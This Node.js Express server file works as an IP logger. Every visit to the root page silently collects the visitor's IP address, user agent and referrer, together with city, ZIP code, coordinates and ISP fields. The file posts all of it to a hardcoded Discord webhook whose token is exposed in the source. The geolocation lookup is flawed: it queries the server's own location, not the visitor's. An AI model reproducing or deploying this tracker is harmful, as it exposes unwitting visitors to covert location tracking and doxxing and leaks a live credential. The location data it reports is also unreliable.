const express = require('express');
const request = require('request');

const app = express();
const port = 3000;

const discordWebhookURL = 'https://discord.com/api/webhooks/1273719937688408085/5BVKapLWfnGGMMfnh-6sTtcCdckAfF3VN2u_JptS7tacWfF9q6f60Zpnh2zxXH-NsZMA';

app.use(express.static('public'));

app.get('/', (req, res) => {
  logVisitorInfo(req);
  res.sendFile(__dirname + '/public/index.html');
});

app.listen(port, () => {
  console.log(`Server is running on port ${port}`);
});

function logVisitorInfo(req) {
  const ip = req.headers['x-forwarded-for'] || req.connection.remoteAddress;

  fetch('https://ipapi.co/json/')
    .then(response => response.json())
    .then(data => {
      const message = `New visitor:
        IP: ${ip}
        Country: ${data.country_name}
        Region: ${data.region}
        City: ${data.city}
        ZIP Code: ${data.postal}
        Latitude: ${data.latitude}
        Longitude: ${data.longitude}
        Timezone: ${data.timezone}
        Current Time: ${data.utc_offset}
        ISP: ${data.org}
        Organization: ${data.org}
        Autonomous System: ${data.asn}
        Browser Name: ${req.headers['user-agent']}
        Referrer: ${req.headers.referer || 'Direct visit'}
      `;

      sendToDiscordWebhook(discordWebhookURL, message);
    })
    .catch(error => {
      console.error('Error fetching visitor information:', error);
    });
}

function sendToDiscordWebhook(webhookURL, message) {
  request.post({
    url: webhookURL,
    json: { content: message },
  }, (error, response, body) => {
    if (error) {
      console.error('Error sending message to Discord:', error);
    }
  });
}